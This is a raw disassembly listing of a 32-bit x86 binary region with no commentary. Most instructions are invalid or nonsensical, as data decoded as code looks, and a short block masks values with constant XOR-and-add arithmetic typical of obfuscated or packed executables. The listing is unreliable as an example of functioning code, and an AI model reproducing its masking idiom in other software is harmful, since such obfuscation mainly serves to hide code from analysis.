  41ae64:	dec    ecx
  41ae65:	inc    DWORD PTR [ebp-0x45]
  41ae68:	xor    ah,bl
  41ae6a:	dec    esi
  41ae6b:	lock lahf 
  41ae6d:	lahf   
  41ae6e:	mov    es,WORD PTR [eax]
  41ae70:	out    dx,al
  41ae71:	mov    al,BYTE PTR [edi-0x77f9f45e]
  41ae77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae78:	pushf  
  41ae79:	jns    0x41aeb7
  41ae7b:	adc    eax,0x33675e35
  41ae80:	pop    ebp
  41ae81:	push   ecx
  41ae82:	clc    
  41ae83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae84:	dec    esi
  41ae85:	push   ebp
  41ae86:	into   
  41ae87:	lahf   
  41ae88:	dec    edi
  41ae89:	push   ebx
  41ae8a:	dec    esi
  41ae8b:	ins    DWORD PTR es:[edi],dx
  41ae8c:	sub    bl,BYTE PTR [ebx]
  41ae8e:	xchg   ecx,eax
  41ae8f:	cmp    BYTE PTR [edx+0x21],cl
  41ae92:	xor    bl,BYTE PTR [ebp-0xdb71d4]
  41ae98:	inc    ecx
  41ae99:	xor    al,0xae
  41ae9b:	loopne 0x41aeb1
  41ae9d:	(bad)  
  41ae9e:	push   esp
  41ae9f:	jmp    0x1a7eaf64
  41aea4:	clc    
  41aea5:	or     DWORD PTR [ebx-0x1],ebp
  41aea8:	mov    ah,0xdd
  41aeaa:	mov    bh,0xca
  41aeac:	pop    eax
  41aead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeae:	cli    
  41aeaf:	in     eax,dx
  41aeb0:	test   DWORD PTR [esi],ebp
  41aeb2:	push   ds
  41aeb3:	test   DWORD PTR [ecx],0x15b72eab
  41aeb9:	pop    edi
  41aeba:	ja     0x41ae72
  41aebc:	(bad)  
  41aebd:	outs   dx,DWORD PTR ds:[esi]
  41aebe:	sti    
  41aebf:	test   DWORD PTR [eax+0x120a3d6b],eax
  41aec5:	push   esi
  41aec6:	or     cl,BYTE PTR [edx+0x7e]
  41aec9:	clc    
  41aeca:	sub    ch,dh
  41aecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aecd:	add    al,0x3
  41aecf:	lock jl 0x41af39
  41aed2:	inc    edx
  41aed3:	mov    ebp,0x9b68da2f
  41aed8:	cld    
  41aed9:	sub    al,ah
  41aedb:	in     al,dx
  41aedc:	dec    eax
  41aedd:	pop    edx
  41aede:	ss mov bl,0x7c
  41aee1:	retf   0x29d4
  41aee4:	cli    
  41aee5:	fs hlt 
  41aee7:	pop    ecx
  41aee8:	aas    
  41aee9:	pop    ss
  41aeea:	enter  0x112,0x16
  41aeee:	in     al,0xfb
  41aef0:	xor    ah,BYTE PTR [eax]
  41aef2:	push   ebp
  41aef3:	cs sub ah,ah
  41aef6:	pop    edx
  41aef7:	pop    ebx
  41aef8:	scas   eax,DWORD PTR es:[edi]
  41aef9:	daa    
  41aefa:	mov    edi,0xdedd3dda
  41aeff:	loop   0x41aeb4
  41af01:	scas   al,BYTE PTR es:[edi]
  41af02:	mov    dl,ah
  41af04:	push   es
  41af05:	arpl   WORD PTR [ebx],cx
  41af07:	les    ecx,FWORD PTR [ebx+0x7d4d2625]
  41af0d:	xor    edi,DWORD PTR [ecx+0x0]
  41af10:	in     eax,dx
  41af11:	lea    edx,[esi-0xe]
  41af14:	jg     0x41aef6
  41af16:	fcomp  QWORD PTR ds:0x7ffd1c10
  41af1c:	jmp    0xb246:0x339e92b5
  41af23:	aas    
  41af24:	pop    esp
  41af25:	repz dec eax
  41af27:	lahf   
  41af28:	aaa    
  41af29:	dec    esi
  41af2a:	push   es
  41af2b:	mov    edx,0xddb820a0
  41af30:	mov    eax,0x4f49ff19
  41af35:	mov    al,0x8f
  41af37:	imul   edx,DWORD PTR [eax],0x9e6563e5
  41af3d:	dec    esi
  41af3e:	jne    0x41af7c
  41af40:	rcl    BYTE PTR [eax+0x19],cl
  41af43:	inc    edx
  41af44:	mov    edx,0x6f11c63f
  41af49:	push   esi
  41af4a:	gs pusha 
  41af4c:	je     0x41afb3
  41af4e:	pop    ecx
  41af4f:	pop    ecx
  41af50:	xchg   edi,eax
  41af51:	retf   0x2a22
  41af54:	mov    edx,0x89969e1d
  41af59:	add    eax,DWORD PTR [ebp-0x5a]
  41af5c:	mov    DWORD PTR [ecx-0x1b],esi
  41af5f:	fild   WORD PTR [edi]
  41af61:	xchg   DWORD PTR [edi],ecx
  41af63:	mov    ebx,0x1fab7520
  41af68:	test   al,0xc6
  41af6a:	jae    0x41afa0
  41af6c:	out    dx,al
  41af6d:	add    eax,DWORD PTR [esi-0x140ec9c6]
  41af73:	or     edi,0x2e
  41af76:	sub    BYTE PTR [eax+edi*1+0x7c88631e],bl
  41af7d:	lock fdivr QWORD PTR [esi]
  41af80:	jnp    0x41af39
  41af82:	ss dec eax
  41af84:	retf   0x547e
  41af87:	mov    ecx,0x1bbd04e8
  41af8c:	dec    esp
  41af8d:	sub    BYTE PTR [edx+0x55],0xe2
  41af91:	fiadd  WORD PTR [esi+0x7f61c657]
  41af97:	cmc    
  41af98:	dec    eax
  41af99:	gs mov ah,0x9a
  41af9c:	dec    ebx
  41af9d:	mov    dh,0x53
  41af9f:	gs cmp al,0xaa
  41afa2:	lods   al,BYTE PTR ds:[esi]
  41afa3:	out    0x1d,eax
  41afa5:	push   cs
  41afa6:	fidiv  WORD PTR [esi-0x2a]
  41afa9:	add    BYTE PTR [edx-0x16347842],al
  41afaf:	xor    BYTE PTR [edx],al
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi+0x1d181003]
  41afc0:	out    0x98,al
  41afc2:	not    BYTE PTR [eax]
  41afc4:	fidivr WORD PTR [edi+0x78]
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41b00e
  41afcc:	outs   dx,BYTE PTR ds:[esi]
  41afcd:	pop    edi
  41afce:	test   eax,0x36def467
  41afd3:	pop    es
  41afd4:	push   ebp
  41afd5:	mov    bl,0x58
  41afd7:	or     ebx,DWORD PTR [ebx]
  41afd9:	inc    edx
  41afda:	and    DWORD PTR [bp+di],edi
  41afdd:	mov    DWORD PTR [edx-0x4cdd2eec],0x484dd381
  41afe7:	xchg   esp,eax
  41afe8:	add    bl,dh
  41afea:	jmp    0x5ec01764
  41afef:	hlt    
  41aff0:	and    esp,DWORD PTR [ecx-0x5d]
  41aff3:	mov    ds:0xea66b0b8,al
  41aff8:	mov    ds:0x4033e134,al
  41affd:	std    
  41affe:	cmp    BYTE PTR ds:0x17d,bh
  41b003:	add    al,0xc9
  41b005:	xor    al,0x1d
  41b007:	popa   
  41b008:	repnz aad 0x44
  41b00b:	shr    BYTE PTR [edx+0x173e421d],1
  41b011:	adc    ebp,DWORD PTR [edx+0x501e4e35]
  41b017:	push   ss
  41b018:	push   edx
  41b019:	pop    es
  41b01a:	out    0xd1,al
  41b01c:	(bad)  
  41b01e:	sub    eax,0xb658165d
  41b023:	cmc    
  41b024:	aaa    
  41b025:	pusha  
  41b026:	rcr    BYTE PTR [ecx],0x8b
  41b029:	out    0x22,eax
  41b02b:	sti    
  41b02c:	repnz stc 
  41b02e:	test   DWORD PTR [eax+eiz*1+0x79],ecx
  41b032:	xcrypt-ecb (bad)
  41b033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b034:	retf   
  41b035:	pop    ecx
  41b036:	stos   DWORD PTR es:[edi],eax
  41b037:	ficomp WORD PTR [ebx+0x6d]
  41b03a:	fcom   st(4)
  41b03c:	out    dx,eax
  41b03d:	int    0x7b
  41b03f:	dec    DWORD PTR [edx+ebp*1+0x780e3423]
  41b046:	mov    eax,ds:0xaa80b782
  41b04b:	mov    al,ds:0xe2844eb2
  41b050:	nop
  41b051:	mov    WORD PTR [edi-0x14],cs
  41b054:	fmul   DWORD PTR fs:[ebx+0x65]
  41b058:	cmp    al,bh
  41b05a:	xchg   ebp,eax
  41b05b:	and    al,0x9
  41b05d:	and    eax,0x92b02c3f
  41b062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b063:	mov    al,0x8f
  41b065:	and    DWORD PTR ds:0x15638503,esi
  41b06b:	lock fidiv WORD PTR [edi-0x4b]
  41b06f:	sub    BYTE PTR [ebx+0x41c5ac37],bh
  41b075:	mov    eax,DWORD PTR [edx]
  41b077:	add    al,0x87
  41b079:	or     DWORD PTR [ecx+eax*1+0x168200e6],ebp
  41b080:	dec    esi
  41b081:	pusha  
  41b082:	mov    edi,0x7b4f6209
  41b087:	fbstp  TBYTE PTR ds:0xdd169923
  41b08d:	test   BYTE PTR [esi+0x34ee172b],al
  41b093:	imul   edx,eax,0xa
  41b096:	adc    DWORD PTR [ebp-0x3],ebp
  41b099:	cmp    BYTE PTR [eax-0x23364029],bl
  41b09f:	mov    ah,BYTE PTR [ebx-0x7e848991]
  41b0a5:	inc    eax
  41b0a6:	pop    edi
  41b0a7:	xor    edi,DWORD PTR [eax+0x42]
  41b0aa:	in     al,0x0
  41b0ac:	jle    0x41b12c
  41b0ae:	ins    DWORD PTR es:[edi],dx
  41b0af:	and    ebx,edi
  41b0b1:	dec    ebx
  41b0b2:	sub    al,0xf8
  41b0b4:	jg     0x41b071
  41b0b6:	xchg   DWORD PTR ss:[esi+eax*1-0x26f3584],ebx
  41b0be:	push   0x70e772df
  41b0c3:	mov    ecx,0x46d0d49c
  41b0c8:	sar    BYTE PTR [ebx],0x6a
  41b0cb:	mov    ebx,0x539632a9
  41b0d0:	imul   edi,DWORD PTR [edi+eiz*8-0x4fec8970],0xffffffca
  41b0d8:	push   cs
  41b0d9:	dec    eax
  41b0da:	mov    esp,DWORD PTR [eax]
  41b0dc:	aad    0x5e
  41b0de:	jae    0x41b0e2
  41b0e0:	mov    DWORD PTR [edi],ebx
  41b0e2:	xor    al,0x14
  41b0e4:	fisub  DWORD PTR [edx-0x3cf2d420]
  41b0ea:	xor    ebx,ebx
  41b0ec:	sti    
  41b0ed:	jle    0x41b097
  41b0ef:	fldcw  WORD PTR [edi]
  41b0f1:	sti    
  41b0f2:	mov    ecx,0x42b4355c
  41b0f7:	pop    ss
  41b0f8:	sub    al,0x79
  41b0fa:	ss sbb al,0x24
  41b0fd:	mov    ebp,0x30c887c0
  41b102:	fdivr  QWORD PTR [ecx+0x760f027e]
  41b108:	add    al,0x71
  41b10a:	xor    BYTE PTR [edx],cl
  41b10c:	adc    bl,0xfa
  41b10f:	outs   dx,BYTE PTR ds:[esi]
  41b110:	dec    eax
  41b111:	ss mov dl,0xaf
  41b114:	or     cl,dh
  41b116:	jle    0x41b0cf
  41b118:	push   edi
  41b119:	or     al,0xb0
  41b11b:	dec    ebx
  41b11c:	les    ebx,FWORD PTR [ebx]
  41b11e:	mov    bh,0x24
  41b120:	fsubr  DWORD PTR fs:[ebx-0x15e057c1]
  41b127:	add    ebx,DWORD PTR [ebx]
  41b129:	(bad)  [ecx]
  41b12b:	in     al,dx
  41b12c:	or     DWORD PTR [ecx],0x59
  41b12f:	jl     0x41b0da
  41b131:	cmp    BYTE PTR [edi+0x514486a3],bl
  41b137:	popa   
  41b138:	pop    eax
  41b139:	xchg   ebp,edi
  41b13b:	bnd ja 0x41b117
  41b13e:	jecxz  0x41b197
  41b140:	adc    cl,BYTE PTR [edx+0x497b1ccd]
  41b146:	inc    DWORD PTR [ebx+0x14]
  41b149:	pop    ds
  41b14a:	(bad)  
  41b14b:	scas   al,BYTE PTR es:[edi]
  41b14c:	xchg   edi,eax
  41b14d:	pop    esp
  41b14e:	or     DWORD PTR [ecx+eax*4+0x6f],ebp
  41b152:	aam    0xf9
  41b154:	imul   ebx,edi,0x272b7817
  41b15a:	loopne 0x41b1d1
  41b15c:	repz push ss
  41b15e:	out    0x6c,al
  41b160:	je     0x41b178
  41b162:	dec    esp
  41b163:	xor    al,0x94
  41b165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b166:	loop   0x41b1a3
  41b168:	mov    esi,0x97e9ccc0
  41b16d:	retf   0xc940
  41b170:	xor    eax,0x8e49e6c8
  41b175:	or     ch,cl
  41b177:	or     eax,0x99f54ae9
  41b17c:	out    dx,al
  41b17d:	mov    edx,0xd6b3b73b
  41b182:	aam    0x5e
  41b184:	cmp    DWORD PTR [ecx-0x392eab12],esi
  41b18a:	ss ds push edi
  41b18d:	mov    ?,WORD PTR [edx+0x584575c]
  41b193:	sbb    ecx,DWORD PTR [ebp+0x5c]
  41b196:	iret   
  41b197:	stos   DWORD PTR es:[edi],eax
  41b198:	jecxz  0x41b12e
  41b19a:	inc    ebp
  41b19b:	pop    esp
  41b19c:	adc    eax,0x1ee689aa
  41b1a1:	dec    edi
  41b1a2:	jb     0x41b216
  41b1a4:	mov    eax,0x7d54515e
  41b1a9:	aaa    
  41b1aa:	mov    ss,ebp
  41b1ac:	mov    ecx,0x90358bb2
  41b1b1:	mov    ebp,0x9f89dd5a
  41b1b6:	push   ds
  41b1b7:	fldcw  WORD PTR [esi-0x15222ef6]
  41b1bd:	das    
  41b1be:	xchg   edi,eax
  41b1bf:	lods   eax,DWORD PTR ds:[esi]
  41b1c0:	daa    
  41b1c1:	js     0x41b1d1
  41b1c3:	push   ebp
  41b1c4:	outs   dx,BYTE PTR ds:[esi]
  41b1c5:	cmp    eax,edi
  41b1c7:	sti    
  41b1c8:	cmp    bh,BYTE PTR [esi]
  41b1ca:	mov    ds:0x15f10954,eax
  41b1cf:	inc    BYTE PTR [esi+0x42]
  41b1d2:	not    BYTE PTR [edx+ecx*4-0x77e7c41a]
  41b1d9:	test   al,0xe4
  41b1db:	jmp    0x41b1d6
  41b1dd:	loopne 0x41b1cc
  41b1df:	mov    ah,0xe6
  41b1e1:	icebp  
  41b1e2:	repnz dec ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	shr    BYTE PTR ss:[bp+si],0x42
  41b1fa:	dec    ebp
  41b1fb:	inc    edx
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b1cc
  41b205:	std    
  41b206:	fist   DWORD PTR [esi+0x15]
  41b209:	or     DWORD PTR [ebx-0x63],ecx
  41b20c:	test   eax,0x88592d88
  41b212:	lock sbb bh,BYTE PTR [ebx-0x311a2b59]
  41b219:	fsubp  st(7),st
  41b21b:	cmc    
  41b21c:	mov    cl,0xb6
  41b21e:	sbb    eax,ebp
  41b220:	and    ecx,DWORD PTR [ebp-0x55bd150e]
  41b226:	xor    ebx,esp
  41b228:	mov    cl,0xd9
  41b22a:	shl    BYTE PTR [ebp-0x5e],1
  41b22d:	ins    DWORD PTR es:[edi],dx
  41b22e:	fnsetpm(287 only) 
  41b230:	inc    ecx
  41b231:	dec    esi
  41b232:	aas    
  41b233:	cli    
  41b234:	popf   
  41b235:	adc    al,bl
  41b237:	adc    eax,0x420cd498
  41b23c:	test   DWORD PTR [ecx-0x7a4d20fe],esi
  41b242:	inc    esp
  41b243:	inc    BYTE PTR [esi-0x43]
  41b246:	jmp    0x8133:0xe1fa9fa6
  41b24d:	pop    esp
  41b24e:	jae    0x41b2ae
  41b250:	mov    edi,DWORD PTR [eax+ebp*8+0x28362e6]
  41b257:	sbb    bl,BYTE PTR [eax]
  41b259:	push   edx
  41b25b:	shr    DWORD PTR [ecx],1
  41b25d:	in     al,0xad
  41b25f:	stos   DWORD PTR es:[edi],eax
  41b260:	cmp    dh,al
  41b262:	pop    ebp
  41b263:	pop    edi
  41b264:	or     cl,BYTE PTR [ecx]
  41b266:	cmovno esp,eax
  41b269:	pop    ebp
  41b26a:	mov    ch,0xff
  41b26c:	dec    ecx
  41b26d:	mov    edi,DWORD PTR [edi]
  41b26f:	and    DWORD PTR [esp+ebx*1+0x25],esi
  41b273:	cs mov esi,0x921acaba
  41b279:	sub    DWORD PTR [ebx-0x669a4047],ebp
  41b27f:	imul   ebx,DWORD PTR [ebx],0x60
  41b282:	and    esp,0x81d45102
  41b288:	test   al,0xe0
  41b28a:	push   es
  41b28b:	cmp    eax,0x5586a769
  41b290:	mov    eax,0xa9bb6aac
  41b295:	mov    bh,0xe5
  41b297:	mov    edx,0x96550176
  41b29c:	scas   al,BYTE PTR es:[edi]
  41b29d:	aam    0xe0
  41b29f:	inc    esp
  41b2a0:	leave  
  41b2a1:	sbb    dh,BYTE PTR [ebx+0x5f41335d]
  41b2a7:	mov    bl,BYTE PTR ds:0x4a4b2ed4
  41b2ad:	mov    ecx,0xa64b5240
  41b2b2:	ds push ss
  41b2b4:	jl     0x41b331
  41b2b6:	dec    edx
  41b2b7:	dec    eax
  41b2b8:	xchg   esi,eax
  41b2b9:	or     al,0x1d
  41b2bb:	jno    0x41b2bf
  41b2bd:	cmp    al,0xb2
  41b2bf:	xchg   esi,eax
  41b2c0:	fcmovbe st,st(0)
  41b2c2:	and    DWORD PTR [ebp-0x41],edx
  41b2c5:	push   edx
  41b2c6:	sub    al,0x88
  41b2c8:	mov    al,fs:0x89f0a2e9
  41b2ce:	mov    esp,0xb17ed7d3
  41b2d3:	stos   BYTE PTR es:[edi],al
  41b2d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2d5:	xchg   ebp,eax
  41b2d6:	or     eax,0xd0f327ef
  41b2db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2dc:	pop    es
  41b2dd:	push   ss
  41b2de:	sub    DWORD PTR [edi],ebp
  41b2e0:	sbb    al,BYTE PTR ds:0x9139074
  41b2e6:	xor    edi,DWORD PTR [ebx-0x3f]
  41b2e9:	mov    al,ds:0x963f8839
  41b2ee:	out    0x65,al
  41b2f0:	mov    dl,0x59
  41b2f2:	sbb    al,0x59
  41b2f4:	xchg   ebp,eax
  41b2f5:	xchg   edi,eax
  41b2f6:	jmp    0xb1f2:0x397437ee
  41b2fd:	cmp    eax,esp
  41b2ff:	jmp    0xd2fcfd2d
  41b304:	jmp    0x4b46c085
  41b309:	cmp    eax,0x21a305e2
  41b30e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b30f:	mov    esp,0xfbaca2fd
  41b314:	out    0x70,al
  41b316:	jno    0x41b2f7
  41b318:	out    dx,eax
  41b319:	mov    WORD PTR [edx-0x21f41b0f],ss
  41b31f:	sbb    BYTE PTR [esi],bl
  41b321:	int    0xfd
  41b323:	or     al,BYTE PTR [edi-0x61]
  41b326:	cmp    eax,0xe5e37c92
  41b32b:	jle    0x41b306
  41b32d:	in     eax,dx
  41b32e:	sub    eax,0x8fb1d2df
  41b333:	fcom   DWORD PTR [ebx+0x2173119c]
  41b339:	mov    bl,0x6c
  41b33b:	jmp    0x41b382
  41b33d:	xchg   ecx,eax
  41b33e:	adc    eax,0xc9c12f43
  41b343:	adc    BYTE PTR [edi+edi*1],ah
  41b346:	cdq    
  41b347:	xchg   esi,eax
  41b348:	add    ah,dl
  41b34a:	inc    edx
  41b34b:	mul    edx
  41b34d:	fidivr DWORD PTR [eax]
  41b34f:	add    eax,DWORD PTR [edx+edi*1]
  41b352:	aad    0x97
  41b354:	mov    BYTE PTR [ebx-0x44dbf71c],dl
  41b35a:	jmp    0xcd683972
  41b35f:	stc    
  41b360:	(bad)  
  41b362:	jecxz  0x41b2e4
  41b364:	cmp    edx,DWORD PTR [eax-0x15699cde]
  41b36a:	or     DWORD PTR [edx+0x38],ecx
  41b36d:	das    
  41b36e:	jne    0x41b2f3
  41b370:	aaa    
  41b371:	sar    DWORD PTR [edi+ecx*8+0x6e8b594b],1
  41b378:	ret    
  41b379:	sti    
  41b37a:	and    DWORD PTR [edx-0xe],ebp
  41b37d:	dec    ecx
  41b37e:	add    BYTE PTR fs:[edi+ecx*2-0x41a655f2],0x62
  41b387:	ror    BYTE PTR [edx+0x9577139],cl
  41b38d:	mov    ebx,0xa90e7604
  41b392:	or     eax,0xa7189609
  41b397:	call   edx
  41b399:	xchg   ebp,eax
  41b39a:	scas   al,BYTE PTR es:[edi]
  41b39b:	(bad)  
  41b39c:	xor    eax,0x5866a1d2
  41b3a1:	or     al,0x6d
  41b3a3:	xor    ebp,ebx
  41b3a5:	or     eax,DWORD PTR [esi]
  41b3a7:	ins    DWORD PTR es:[edi],dx
  41b3a8:	inc    esi
  41b3a9:	fsub   QWORD PTR [ebx-0x4569fdfc]
  41b3af:	test   DWORD PTR [esi],esi
  41b3b1:	cdq    
  41b3b2:	mov    WORD PTR [ebx+0x47],cs
  41b3b5:	fwait
  41b3b6:	dec    esp
  41b3b7:	xchg   ebx,eax
  41b3b8:	fistp  WORD PTR [eax-0x25a2d69d]
  41b3be:	(bad)  
  41b3bf:	or     DWORD PTR [edx],edi
  41b3c1:	out    dx,eax
  41b3c2:	mov    ebx,0x76a4c00b
  41b3c7:	cmp    DWORD PTR [ebp+eiz*8+0x287bc911],0x8228079e
  41b3d2:	mov    cl,BYTE PTR [ecx]
  41b3d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3d5:	jmp    0x9607c9a9
  41b3da:	rcl    BYTE PTR [esi-0x41],0x49
  41b3de:	pop    esi
  41b3df:	pop    esi
  41b3e0:	dec    ebx
  41b3e1:	stc    
  41b3e2:	pop    esi
  41b3e3:	xchg   BYTE PTR [ecx+0x11],cl
  41b3e6:	pop    ss
  41b3e7:	mov    ch,0x2d
  41b3e9:	mov    bl,0xf8
  41b3eb:	inc    ebp
  41b3ec:	cmp    al,0xbe
  41b3ef:	push   edi
  41b3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3f1:	xor    cl,BYTE PTR [edx+0x246174f5]
  41b3f7:	int3   
  41b3f8:	jne    0x41b3d4
  41b3fa:	dec    ebp
  41b3fb:	adc    al,0x80
  41b3fd:	mov    dl,0x3d
  41b3ff:	adc    eax,0xeac72cb5
  41b404:	inc    edi
  41b405:	sbb    bl,BYTE PTR [ebp+0x2e76237c]
  41b40b:	ds xchg esi,eax
  41b40d:	cmp    al,0x2b
  41b40f:	adc    eax,0xcbc83d4d
  41b414:	shl    DWORD PTR [ecx-0x62a5e7ed],0xb9
  41b41b:	add    ecx,DWORD PTR [edi]
  41b41d:	scas   eax,DWORD PTR es:[edi]
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	cmp    eax,0xc0f3e350
  41b4be:	loop   0x41b53f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b4e5
  41b4c6:	fbstp  TBYTE PTR [esi-0x10]
  41b4c9:	aam    0x97
  41b4cb:	icebp  
  41b4cc:	adc    BYTE PTR [edx],ah
  41b4ce:	inc    esp
  41b4cf:	push   ss
  41b4d0:	mov    es,WORD PTR [edi+0x46d64d36]
  41b4d6:	scas   eax,DWORD PTR es:[edi]
  41b4d7:	xchg   edi,eax
  41b4d8:	adc    BYTE PTR [ecx],ch
  41b4da:	mov    cl,0x1
  41b4dc:	mov    ds:0x9504e94d,eax
  41b4e1:	cmp    al,0xfd
  41b4e3:	loopne 0x41b521
  41b4e5:	shl    DWORD PTR [eax-0x3f],1
  41b4e8:	repz loope 0x41b4ea
  41b4eb:	aam    0xa9
  41b4ed:	push   0x6c7d62f0
  41b4f2:	cdq    
  41b4f3:	push   edi
  41b4f4:	inc    esi
  41b4f5:	xor    ah,BYTE PTR [eax]
  41b4f7:	ja     0x41b50e
  41b4f9:	fwait
  41b4fa:	adc    bh,BYTE PTR [ecx-0x4b]
  41b4fd:	ss aad 0x8f
  41b500:	jae    0x41b4b8
  41b502:	mov    dh,0x3e
  41b504:	jl     0x41b50e
  41b506:	adc    DWORD PTR [ecx],esi
  41b508:	in     al,0x16
  41b50a:	and    dl,bh
  41b50c:	jnp    0x41b4cc
  41b50e:	xor    dl,BYTE PTR [ebp-0x44]
  41b511:	das    
  41b512:	or     DWORD PTR [edx-0x6088773a],edx
  41b518:	jp     0x41b550
  41b51a:	dec    eax
  41b51b:	je     0x41b4b1
  41b51d:	les    esi,FWORD PTR [eax]
  41b51f:	adc    edx,DWORD PTR [eax-0x42b626d7]
  41b525:	jge    0x41b52f
  41b527:	mov    dl,0xc8
  41b529:	add    dh,BYTE PTR [ebp+0x3c]
  41b52c:	sbb    dh,BYTE PTR [ebp+0x2c7616db]
  41b532:	ret    
  41b533:	loopne 0x41b555
  41b535:	fwait
  41b536:	dec    ebp
  41b537:	xor    BYTE PTR [edx-0x4a],0xde
  41b53b:	dec    ebx
  41b53c:	lahf   
  41b53d:	cmp    BYTE PTR [eax],0xdf
  41b540:	fisttp QWORD PTR [ebp-0x1cd8513d]
  41b546:	xor    BYTE PTR [edx],bh
  41b548:	sbb    eax,DWORD PTR [ebx+0x718f759]
  41b54e:	xchg   esp,eax
  41b54f:	popa   
  41b550:	fs jnp 0x41b4fc
  41b553:	int    0x53
  41b555:	jmp    0x5089:0xc0567055
  41b55c:	sbb    esp,ecx
  41b55e:	pcmpeqb mm0,QWORD PTR [ebx]
  41b561:	lods   al,BYTE PTR ds:[esi]
  41b562:	push   edi
  41b563:	pop    edi
  41b564:	loopne 0x41b58c
  41b566:	sbb    DWORD PTR [ecx-0x33961d00],edx
  41b56c:	es add eax,0x1afc2033
  41b572:	(bad)  
  41b573:	jle    0x41b5cb
  41b575:	xchg   edx,eax
  41b576:	fisub  DWORD PTR ds:0xba830697
  41b57c:	mov    eax,ds:0x95bd5f3c
  41b581:	add    DWORD PTR [edi],esp
  41b583:	repnz aam 0xe3
  41b586:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b588:	inc    edi
  41b589:	fs (bad) 
  41b58b:	cli    
  41b58c:	push   es
  41b58d:	cwde   
  41b58e:	jp     0x41b5e8
  41b590:	imul   edi,DWORD PTR [ebp+0x7b52b8ca],0xfffffff5
  41b597:	loopne 0x41b5db
  41b599:	call   0xd574d6d3
  41b59e:	fidiv  WORD PTR [esi+0x3ad86bb7]
  41b5a4:	rcr    BYTE PTR [eax-0x70c1ba5],cl
  41b5aa:	nop
  41b5ab:	mov    eax,ds:0x28d35ec7
  41b5b0:	mov    al,ch
  41b5b2:	jns    0x41b626
  41b5b4:	out    dx,eax
  41b5b5:	xchg   DWORD PTR [ecx-0x65],edx
  41b5b8:	dec    eax
  41b5b9:	ss retf 0x2a43
  41b5bd:	jl     0x41b5fa
  41b5bf:	jmp    0x41b5de
  41b5c1:	or     eax,0x7c399a3
  41b5c6:	push   ss
  41b5c7:	mov    edx,0x8e15f996
  41b5cc:	jb     0x41b57b
  41b5ce:	jmp    DWORD PTR [edi]
  41b5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5d1:	inc    DWORD PTR [ecx]
  41b5d3:	stos   WORD PTR es:[edi],ax
  41b5d5:	and    BYTE PTR [edi-0x554db63a],0x7f
  41b5dc:	dec    eax
  41b5dd:	in     al,0xcc
  41b5df:	add    edx,ebp
  41b5e1:	or     DWORD PTR [edi+0x238358e],0x8c2ae35c
  41b5eb:	int    0x92
  41b5ed:	les    ebp,FWORD PTR [ecx]
  41b5ef:	aas    
  41b5f0:	pop    ecx
  41b5f1:	outs   dx,DWORD PTR ds:[esi]
  41b5f2:	aaa    
